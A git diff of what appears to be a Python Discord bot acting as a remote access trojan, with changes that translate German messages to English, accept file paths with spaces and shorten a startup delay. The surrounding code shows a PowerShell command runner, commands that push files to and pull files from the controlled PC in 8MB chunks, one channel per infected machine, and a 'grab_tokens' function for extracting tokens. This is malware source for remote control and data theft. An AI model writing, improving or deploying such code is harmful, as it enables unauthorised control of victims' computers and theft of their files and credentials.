@@ -1,5 +1,6 @@
 # Ersetzen Sie dies durch Ihr Bot-Token
-TOKEN = 'YOUR_BOT_TOKEN'
+TOKEN = 'YOUR_DISCORD_TOKEN'
+
 GUILD_ID = YOUR_GUILD_ID
 
 # Ersetzen Sie dies durch Ihre Discord-Benutzer-ID(s), die den Bot steuern dürfen
@@ -385,12 +386,13 @@ async def powershell(ctx, *, command):
         except discord.errors.NotFound:
             pass
         await log_message(ctx, f'Fehler bei der Ausführung des Befehls: {str(e)}')
-
+        
 @bot.command()
 @commands.check(is_authorized)
-async def file_upload(ctx, target_path):
+async def file_upload(ctx, *target_path_parts):
+    target_path = ' '.join(target_path_parts)
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await send_temporary_message(ctx, "This command can only be executed in the specific channel for this PC.", duration=10)
         return
 
     working_message = await ctx.send("🔄 Working...")
@@ -401,19 +403,20 @@ async def file_upload(ctx, target_path):
                 async with aiofiles.open(target_path, 'wb') as f:
                     await f.write(file_data)
             await working_message.delete()
-            await log_message(ctx, 'Datei(en) erfolgreich hochgeladen.')
+            await log_message(ctx, "File(s) successfully uploaded.")
         else:
             await working_message.delete()
-            await log_message(ctx, 'Keine Dateien zum Hochladen gefunden.')
+            await log_message(ctx, "No files found to upload.")
     except Exception as e:
         await working_message.delete()
-        await log_message(ctx, f'Fehler beim Hochladen der Datei: {str(e)}')
+        await log_message(ctx, f"Error uploading file: {str(e)}")
 
 @bot.command()
 @commands.check(is_authorized)
-async def file_download(ctx, file_path):
+async def file_download(ctx, *file_path_parts):
+    file_path = ' '.join(file_path_parts)
     if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        await send_temporary_message(ctx, "This command can only be executed in the specific channel for this PC.", duration=10)
         return
 
     working_message = await ctx.send("🔄 Working...")
@@ -430,7 +433,7 @@ async def file_download(ctx, file_path):
                 if file_size <= 8 * 1024 * 1024:  # 8MB
                     await ctx.send(file=discord.File(file_path))
                 else:
-                    await send_temporary_message(ctx, "Datei ist zu groß, um direkt gesendet zu werden.", duration=10)
+                    await send_temporary_message(ctx, "File is too large to be sent directly.", duration=10)
                     part_number = 1
                     with open(file_path, 'rb') as f:
                         while chunk := f.read(8 * 1024 * 1024):
@@ -439,13 +442,13 @@ async def file_download(ctx, file_path):
                                 part_file.write(chunk)
                             await ctx.send(file=discord.File(part_file_path))
                             part_number += 1
-            await log_message(ctx, 'Datei erfolgreich heruntergeladen.')
+            await log_message(ctx, "File successfully downloaded.")
         else:
-            await log_message(ctx, 'Datei nicht gefunden.')
+            await log_message(ctx, "File not found.")
         await working_message.delete()
     except Exception as e:
         await working_message.delete()
-        await log_message(ctx, f'Fehler beim Herunterladen der Datei: {str(e)}')
+        await log_message(ctx, f"Error downloading file: {str(e)}")
         
 @bot.command()
 @commands.check(is_authorized)
@@ -1434,7 +1437,7 @@ async def grab_tokens(ctx):
         await log_message(ctx, f'Error whilst extracting tokens: {str(e)}', duration=10)
 
 def main():
-    time.sleep(15)
+    time.sleep(8)
     load_admin_status()
     check_single_instance()
 
